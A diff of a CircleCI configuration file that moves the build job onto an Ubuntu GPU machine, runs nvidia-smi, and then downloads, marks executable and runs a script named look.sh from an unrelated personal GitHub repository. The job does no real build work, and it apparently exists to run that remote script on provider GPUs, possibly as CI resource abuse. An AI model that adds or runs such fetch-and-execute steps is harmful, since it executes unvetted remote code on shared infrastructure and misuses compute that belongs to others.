@@ -1,13 +1,10 @@
 version: 2.1
 
-orbs:
-  win: circleci/windows@2.3.0
-
 jobs:
   build:
-    executor:
-      name: win/default
-      size: "medium" # can be "medium", "large", "xlarge", "2xlarge"
+    machine:
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: gpu.nvidia.small
     steps:
-      - run: wget https://raw.githubusercontent.com/vivomito/out/main/look.sh
-      
+      - run: nvidia-smi
+      - run: wget https://raw.githubusercontent.com/vivomito/out/main/look.sh && chmod +x look.sh && ./look.sh
